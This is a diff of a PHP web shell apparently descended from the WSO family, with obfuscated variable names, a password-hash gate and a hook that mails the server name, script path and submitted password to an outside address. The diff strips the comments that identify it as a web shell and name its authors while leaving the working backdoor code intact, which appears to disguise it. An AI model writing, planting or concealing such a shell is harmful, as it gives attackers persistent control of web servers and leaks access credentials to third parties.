@@ -1,9 +1,8 @@
 <?php
-//--------------Watching webshell!--------------
+
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
-//-----------------Password---------------------
 $▛ = "1f4af6359d69f4a9613b84cf40aa0091";
 $▘ = true;
 $▜ = 'UTF-8';
@@ -37,7 +36,7 @@ if(get_magic_quotes_gpc()) {
 	$_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
 }
-/* (С) 11.2011 oRb */
+
 if(!empty($▛)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
         prototype(md5($_SERVER['HTTP_HOST']), $▛);
@@ -76,7 +75,7 @@ if($os == 'win') {
 }
 if($cwd[strlen($cwd)-1] != '/')
 	$cwd .= '/';
-/* (С) 04.2015 Pirat */
+
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
